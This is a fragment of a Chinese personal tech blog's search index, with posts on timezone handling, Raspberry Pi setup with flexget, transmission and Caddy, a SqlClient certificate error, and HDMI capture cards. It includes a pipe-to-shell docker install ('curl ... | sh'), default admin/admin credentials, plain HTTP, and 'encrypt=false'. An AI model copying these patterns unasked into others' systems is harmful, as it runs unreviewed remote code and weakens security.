","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:4:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"網站需要做跨時區 後端接收前端日期時間 sequenceDiagram 後端-\u003e\u003e前端: 傳給前端 ISO8601 格式(不需要加時區) Note Right of 前端: 前端判斷瀏覽器時區顯示時間 前端接收後端日期時間 sequenceDiagram 前端-\u003e\u003e後端: 傳給前端 ISO8601 格式(不需要加時區) Note Right of 後端: 後端存入資料庫時間不加上時區 簡單來說後端正常資料要存 UTC 時間，前端依照瀏覽器去控制時區。但前端回給後端也不須加上時區或者用 ISO8601格式，如我現在2023-04-01 20:00:00 台灣時區，但是前端使用2023-04-01T12:00:00Z和2023-04-01T20:00:00+08:00都可以，後端其實用工具解析會得到UTC時間(沒有時區的)，存在資料庫會是 UTC時區。 ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:5:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"前端 UI 取得日期時間處理 UTC 時間方式 這邊主要說程式，這邊前端用datetimepicker 套件或用 HTML5 input[type=datetime-local] 取出時間轉 ISO8601就可以了。 new Date(input.value).toISOString(); 參考: Using the input datetime-local. As you probably know already, in order… | by Andrea Giammarchi | Medium ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:5:1","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"後端處理日期時間 每個程式語言都不一樣。這邊就放點相關處理方式。 Use ISO-8601 Date and Time Format with PHP – 佛祖球球 php strtotime 也能直接轉 Asp.Net Core Json配置（大小写、日期格式等）_Morcom.G的博客-CSDN博客 [.NET Core] System.Text.Json 添加 Customize JsonConverter | K. C. - 點部落 Converting ISO 8601-compliant String to java.util.Date - Stack Overflow Formatting JSON Dates in Spring Boot | Baeldung ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:5:2","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"網站不需要做跨時區 很簡單，後端程式存現在時區格式，前端接到無需做特別轉換，這邊就真的很簡單。怕未來要做跨時區，但現在階段無須跨時區，這邊可以用 UTC 時區，傳給前端再做時區轉換。 這邊也沒有什麼規定，不過也要看公司有沒有人這樣做，不然其他人覺得你很奇怪怎麼這樣用? ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:6:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["Linux"],"content":"最近安裝 Raspberry Pi 發現網站又變了。以前我們都是下載映像檔，下載完成直接用 win32diskimager 燒到 SD卡。前幾年我安裝發現映像檔沒有啟用 ssh，這邊發現 config.txt 設定調整可以解決，最近重裝 Raspberry Pi 發現又變了，還要抓他們官方程式，但我覺得用他們提供工具方便調整一些設定。 ","date":"2023-04-01","objectID":"/blog/posts/Raspberry-Pi-2023-%E5%B9%B4%E5%AE%89%E8%A3%9D%E5%AE%89%E8%A3%9D-OS/:0:0","tags":["pi"],"title":"Raspberry Pi 2023 年安裝安裝 OS","uri":"/blog/posts/Raspberry-Pi-2023-%E5%B9%B4%E5%AE%89%E8%A3%9D%E5%AE%89%E8%A3%9D-OS/"},{"categories":["Linux"],"content":"官方安裝 OS 工具 下載連結: Raspberry Pi OS – Raspberry Pi 點選操作系統 這邊我選Raspberry Pi OS ，發現今年已經有 64Bit，3代以上版本可以安裝，推薦能用 64Bit 就用 64Bit 。這邊因為我是用舊版，所以就沒有選擇這個。 插上沒用的 USB 可以設定映像檔設定，如: 主機名稱、SSH服務、帳號名稱密碼、Wifi、…等等相關系統設定都可以在這邊設定。 這邊 Host 有一個技巧，當你樹莓派不知道 IP 時候可以 hostname.local 就能連到 IP，這個現在所有 OS 幾乎都支援，這是一個叫mDNS，可以參考: Day 17 mDNS是啥東西 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天。 開機看到有幫我擴充空間，以前都要手動作。 2023年安裝和設定樹莓派就是這麼簡單，但最近樹莓派價錢貴得嚇人…。 ","date":"2023-04-01","objectID":"/blog/posts/Raspberry-Pi-2023-%E5%B9%B4%E5%AE%89%E8%A3%9D%E5%AE%89%E8%A3%9D-OS/:1:0","tags":["pi"],"title":"Raspberry Pi 2023 年安裝安裝 OS","uri":"/blog/posts/Raspberry-Pi-2023-%E5%B9%B4%E5%AE%89%E8%A3%9D%E5%AE%89%E8%A3%9D-OS/"},{"categories":["Linux"],"content":"最近動物機要重裝，每次寫很多次，但新官設定都會調整。這邊簡單做個紀錄。 我要有幾個需求 BT下載機 外接 USB 硬碟 自動抓番劇 線上 Web 存取檔案 這邊使用 Raspberry Pi 1 做這些任務，裝完目前看起來 Pi 1 能順利做這些事，之後要準備放我朋友家網路掛機。 ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:0:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"切割磁區和掛載磁區 sudo fdisk -l sudo mkfs -t ext4 /dev/sda1 掛載磁區 sudo mkdir -p /media/extHDD sudo mount /dev/sda1 /media/extHDD sudo blkid #/dev/sda1: UUID=\"4411c5bb-2392-45d8-a7ba-7b40275a84fd\" BLOCK_SIZE=\"4096\" TYPE=\"ext4\" PARTUUID=\"42f5e0d3-01\" 在/etc/fstab加下面設定 UUID=\"4411c5bb-2392-45d8-a7ba-7b40275a84fd\" /media/extHDD ext4 rw,defaults,nofail 0 0 # 確認/etc/fstab 設定無錯誤 mount -a #可用 df -mh 確認裝置是否有掛載 ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:1:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"安裝 tranmission sudo apt update sudo apt-get install transmission-daemon How to set up transmission-daemon on a Raspberry Pi and control it via web interface - Linux Tutorials - Learn Linux Configuration ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:2:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"安裝 flexget 已經寫很多次在樹莓派安裝 flexget - 程式狂想筆記，但沒想到官方有出現教學，這次就照官方操作。 There may be better options for some of the steps, but this works (2022) well. 這個真的很好笑，可能後面幾年就不能跑了。 # Python3 sudo apt install python3-full libpython3-dev # 我是無法抓 官方寫 Install distutils (necessary?) # sudo apt install distutils 下載 pip cd /tmp wget https://bootstrap.pypa.io/get-pip.py sudo python3 get-pip.py 設定 pipx python3 -m pip install --user pipx ~/.local/bin/pipx ensurepath source ~/.bashrc 下載flexget ~/.local/bin/pipx install flexget 這邊注意下載transmission-rpc關聯要這樣做。 pipx inject flexget \"transmission-rpc\u003e=3.0.0,\u003c4.0.0\" 設定開機啟動 Scheduling | FlexGet @reboot /usr/local/bin/flexget daemon start -d 這邊要改成你的 flexget 路徑，不知道可以用 which flexget。 /home/pi/.local/bin/flexget 設定密碼 flexget web passwd \u003csome_password\u003e http://pi1.local:5050 進去就可以登入進去。 這邊再把以下設定貼到 Config裡面。 web_server: yes templates: default: transmission: host: 127.0.0.1 port: 9091 username: admin password: admin add_paused: no path: /media/extHDD/Download/TV/{{task}} free_space: path: /media/extHDD/ space: 2000 from_transmission: host: 127.0.0.1 port: 9091 username: admin password: admin only_complete: yes if: - \"'季度全集' in category\": reject tasks: \"TV-Re: 從零開始的異世界生活 第二季\": rss: url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=%E7%95%B0%E4%B8%96%E7%95%8C%E7%94%9F%E6%B4%BB+team_id%3A604+BIG5+1080+25 other_fields: [category] accept_all: yes template: default transmission: path: /media/extHDD/Download/TV/202007/{{task[3:]}} \"TV-英雄王 為了窮盡武道而轉生 而後成為世界最強見習騎士\": rss: url: https://share.acgnx.se/rss-sort-1.xml?keyword=%E8%8B%B1%E9%9B%84%E7%8E%8B+%E6%84%9B%E6%88%80 other_fields: [category] accept_all: yes template: default transmission: path: /media/extHDD/Download/TV/202211/{{task[3:]}} schedules: - tasks: \"TV-*\" schedule: day_of_week: mon,tue,wed,thu,fri,sat,sun hour: \"4,6,8,11,13,15,17,20\" jitter: 60 還學會 crontab 系統開機啟動 flexget 方法。 Info malagege/flexget - Docker Image | Docker Hub 自己參照官方 Dockerfile 產生的，但後來就沒使用，有興趣的人可以用用看。 Info pipx 第一次安裝，不需要 root 權限就能使用。但做依賴安裝需要搭配 pipx inject 指令去做調整，真的是滿有趣東西。 Warning 我想，您或許會很好奇，咦！那麼通常一般的主機會有多少個 port 呢？！正常來說，所有的 port 是由 1 ~ 65535 這麼多個啦！好啦，那麼在這些 port 上面有沒有保留給系統使用的呢！？是有的！一般而言，只有 root 才可以啟用 1 ~ 1023 以內的 port ，這些 port 就是特殊的埠口，是保留給系統來使用的！至於大於 1024 以上的 port 除了給系統隨機取用來作為連線的需求之外，也可以用來作為服務的 LISTEN 之用。舉例來說，如果您覺得 0~1023 的 port 需要以 root 的身份來啟動，這樣如果該 port 的程序被入侵了，那麼入侵者將擁有 root 的權限，這實在很危險～所以，這個時候您可以以一般身份帳號並使用大於 1024 以上的 port 來啟用某些服務呢！例如 FTP 的 port 預設為 21 ，您也可以將 FTP 以 10021 的 port number 來啟動，並且使用一般身份的帳號來啟用這個 FTP 的服務，會比較安全一點。不過，這樣一來會造成 client 端的困擾，因為一般 FTP Client 軟體都是預設以連接到主機的 port 21 來進行連線的，現在您的主機 FTP 改成 10021 了，除非您的 Client 知道這個設定值，否則 Client 軟體就無法連線成功了。 可以參考: 鳥哥的 Linux 私房菜 – 限制 Linux 對外的埠口 port limit 我這邊在想奇怪一般使用者怎麼能開 port，原來超過1024就不需要 root 權限，這邊不知道 Windows 也是不是這樣? ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:3:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"安裝 docker Warning warning 這邊我是為了用 Caddy Server，所以才安裝 Docker，如果你沒有要使用的話可以不用安裝。 Install Docker Engine on Debian 一代機裝完遇到問題，顯示錯誤docker.service: Failed with result 'core-dump'.。 arm - Docker ‘core-dump’ error when starting service - Raspberry Pi Stack Exchange 還遇到載不到deb套件。這邊更改DNS就能抓到package，這邊真的很奇怪。 這邊使用官方用好的 shell ，輸入後正常安裝，參考如下。 vi /etc/resolv.conf # 第一個設定改成 8.8.8.8 ，後續再改回來 # Generated by resolvconf nameserver 8.8.8.8 # 192.168.1.203 \u003c--這是我的舊的設定 nameserver 192.168.1.1 curl https://get.docker.com | sh sudo usermod -G docker -a _username_ ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:4:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"caddy-server 方便用 web 瀏覽影片。不用 apache 是會有亂碼問題，而且用這個也比較方便。 mkdir CaddyServer cd CaddyServer Caddyfile http://:80 root * /srv/ file_server browse basicauth { user _hashpassword_ } hashpassword 可以用 caddy hash-password --plaintext \u003cpassword\u003e 產生。 docker-compose.yml version: '3' services: caddy: image: arm32v6/caddy restart: unless-stopped ports: - \"80:80\" volumes: - /media/extHDD/:/srv - $PWD/Caddyfile:/etc/caddy/Caddyfile docker compose up -d 搞定。 ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:5:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":["Linux"],"content":"反向代理設定調整 最後把 Caddyfile 做反向代理，這邊研究很久特別紀錄一下。方便用 80 port也能連 flexget。 Danger 這邊為什麼我設定 80 port，正常對外網路應該要用 443 port。主要這個服務要用在我和我朋友家，我朋友因為從事網路工作，說正常 https 是防止周邊設備網路竊取，我這邊有提 ISP 外面路由可能會竊取封包問題，他說正常他們不太可能會做這些事情，因為進去設備他們都要送什麼簽核單之類的，正常不會有人做擷取動作，這邊就不使用 https。(反正也沒有很重要資料) flexget 設定 base_url。 web_server: base_url: flexget templates: default: transmission: host: 127.0.0.1 port: 9091 username: admin password: admin add_paused: no path: /media/extHDD/Download/TV/{{task}} free_space: path: /media/extHDD/ space: 2000 from_transmission: host: 127.0.0.1 port: 9091 username: admin password: admin only_complete: yes if: - \"'季度全集' in category\": reject tasks: \"TV-Re: 從零開始的異世界生活 第二季\": rss: url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=%E7%95%B0%E4%B8%96%E7%95%8C%E7%94%9F%E6%B4%BB+team_id%3A604+BIG5+1080+25 other_fields: [category] accept_all: yes template: default transmission: path: /media/extHDD/Download/TV/202007/{{task[3:]}} \"TV-英雄王，為了窮盡武道而轉生～而後成為世界最強見習騎士♀～\": rss: url: https://share.acgnx.se/rss-sort-1.xml?keyword=%E7%82%BA%E4%BA%86%E7%AA%AE%E7%9B%A1%E6%AD%A6%E9%81%93%E8%80%8C%E8%BD%89%E7%94%9F+%E6%84%9B%E6%88%80+%E7%B9%81 other_fields: [category] accept_all: yes template: default transmission: path: /media/extHDD/Download/TV/202211/{{task[3:]}} schedules: - tasks: \"TV-*\" schedule: day_of_week: mon,tue,wed,thu,fri,sat,sun hour: \"4,6,8,11,13,15,17,20\" jitter: 60 Caddyfile http://:80 root * /srv/ file_server browse basicauth { user $2a$14$ } handle_path /flexget/* { rewrite * /flexget{path} reverse_proxy host.docker.internal:5050 } docker-compose.yml version: '3' services: caddy: image: arm32v6/caddy restart: unless-stopped extra_hosts: - \"host.docker.internal:host-gateway\" ports: - \"80:80\" volumes: - /media/extHDD/:/srv - $PWD/Caddyfile:/etc/caddy/Caddyfile ","date":"2023-03-31","objectID":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/:6:0","tags":["linux","flexget","pi"],"title":"2023年樹莓派重裝 Flexget","uri":"/blog/posts/2023%E5%B9%B4%E6%A8%B9%E8%8E%93%E6%B4%BE%E9%87%8D%E8%A3%9D-Flexget/"},{"categories":[".Net Core"],"content":"最近加上 .Net Cache 功能程式就出現 A connection was successfully established with the server, but then an error occurred during the login process，等等我什麼都沒有做，後來爬到這篇使用 Microsoft.Data.SqlClient 連線資料庫發生憑證錯誤，才鬆了一口氣。 ","date":"2023-03-31","objectID":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/:0:0","tags":[".net core","sql server","憑證"],"title":"Net 程式資料庫憑證錯誤 a Connection Was Successfully Established With the Server, but Then an Error Occurred During the Login Process","uri":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/"},{"categories":[".Net Core"],"content":"心智圖 mindmap root((程式憑證錯誤)) 問題 SqlClient 解決方法 安裝憑證 設定檔取消憑證 ","date":"2023-03-31","objectID":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/:1:0","tags":[".net core","sql server","憑證"],"title":"Net 程式資料庫憑證錯誤 a Connection Was Successfully Established With the Server, but Then an Error Occurred During the Login Process","uri":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/"},{"categories":[".Net Core"],"content":"本文 在 Microsoft.Data.SqlClient 4.0 以上版本，會自動將連線字串的 Encrypt 屬性設定成 true。這是因為隨著雲端資料庫的使用量增加，為了確保這些連線是安全的，所以預設將此屬性設定成 true。 因此在做資料庫連線的時候，使用 Microsoft.Data.SqlClient 4.0 本身不會有問題，但在存取資料的時候，會因為連線字串被加上 Encrypt 加密屬性而去檢查 SQL Server 的授信任跟憑證，當 SQL Server 沒有被設定憑證的時候，SQL Server 很貼心的會自己建立一個 self-signed 憑證，而這個憑證在你的電腦上一般來說是不會有的。 … 在使用 Microsoft.Data.SqlClient 4.0 的時候，連線字串會自動加上 encrypt=true; 參考: 使用 Microsoft.Data.SqlClient 連線資料庫發生憑證錯誤 想說我資料庫沒有加確認憑證，TrustServerCertificate=True; 沒有再設定檔案，這邊之前有瞄到 Microsoft.Extensions.Caching.SqlServer 有用Microsoft.Data.SqlClient 套件，所以我上到測試環境遇到這個狀況，在 ConnectionString 加上encrypt=false;解決這個問題。 又解決一個問題，水了一篇文章。😜 好啦，其實正確應該要安裝憑證，但正常內網通常不一定要做，這篇機緣的話我可能再研究看看。 ","date":"2023-03-31","objectID":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/:2:0","tags":[".net core","sql server","憑證"],"title":"Net 程式資料庫憑證錯誤 a Connection Was Successfully Established With the Server, but Then an Error Occurred During the Login Process","uri":"/blog/posts/Net-%E7%A8%8B%E5%BC%8F%E8%B3%87%E6%96%99%E5%BA%AB%E6%86%91%E8%AD%89%E9%8C%AF%E8%AA%A4-A-connection-was-successfully-established-with-the-server-but-then-an-error-occurred-during-the-login-process/"},{"categories":["實用工具"],"content":"最近舊電腦要當測試機，但是我缺少螢幕可以用，他旁邊有舊筆電可以用，所以就找找網路上有什麼好用工具，這邊發現 HDMI Video Capture 好像可以解決我的問題，這邊就買回來就當作開箱。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:0:0","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"我的需求 平常是希望遠端控制舊電腦，但怕有時候出狀況要很麻煩，插 HDMI 的螢幕只有少數幾台，要搬來搬去也很麻煩，剛好我有一台測試用筆電，真想把它當螢幕使用，這邊搜尋關鍵字就找到我要的東西。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:1:0","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"HDMI Video Capture Warning 注意，這個方法筆電也要能開機。這只是用擷取器顯示在你電腦程式畫面上，這邊當然也要注意，需要準備鍵盤，因為不是當遠端使用。 PChome賣 399: 遊戲直播專用HDMI影音擷取卡 - PChome 24h購物 蝦皮我 199 就買到，順便買其他東西。 但我發現會有色差，但以臨時用這個來說是件小事，會在意的人可能要注意，高級的可能就不會有這個問題。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:2:0","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Window 使用方法 Windows 10 使用相機可以當HDMI擷取撥放器。可以看下面影片，我也是看下面影片才知道有這個神器。 使用很簡單，點選右上角就能切換到你的 HDMI 擷取器。 但我的筆電作業系統是 Ubuntu，所以我得找找方法 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:2:1","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Ubuntu 使用方法 參考:Install hdmi-usb-dongle on Linux | Snap Store 用 SNAP 安裝 hdmi-usb-dongle。 安裝指令也非常簡單。 sudo snap install hdmi-usb-dongle 在選應用程式就可以看到。這邊第一次安裝打不開的話，建議重開機，我這邊就能順利使用。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:2:2","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"彩蛋 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:3:0","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"虛擬鍵盤呼叫 當我插滑鼠懶得找鍵盤使用，點選控制台右鍵選單，顯示觸控式鍵盤按鈕可以透過這種方式解決問題。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:3:1","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"真筆電當螢幕 Google 爬到了，這邊覺得很有趣，就先記一下。以前筆電都丟掉了…，也無法使用了，不過買標準驅動版可能會很麻煩。 ","date":"2023-03-31","objectID":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/:3:2","tags":["hdmi","替代螢幕"],"title":"筆電當成螢幕外接其他電腦設備方法","uri":"/blog/posts/%E7%AD%86%E9%9B%BB%E7%95%B6%E6%88%90%E8%9E%A2%E5%B9%95%E5%A4%96%E6%8E%A5%E5%85%B6%E4%BB%96%E9%9B%BB%E8%85%A6%E8%A8%AD%E5%82%99%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"一般我們網路連不到一些網站，通常覺得應該是網站掛掉，不會是 ISP 出問題。之前 Imgur 有時上傳圖片會失敗，但最近改用 Github Gist 有時候也是會連不到。這邊特別記錄中華電信光世代連不到特定網站問題與報修方式，雖然不能說大家狀況會跟我一樣，但可以給大家做個參考。 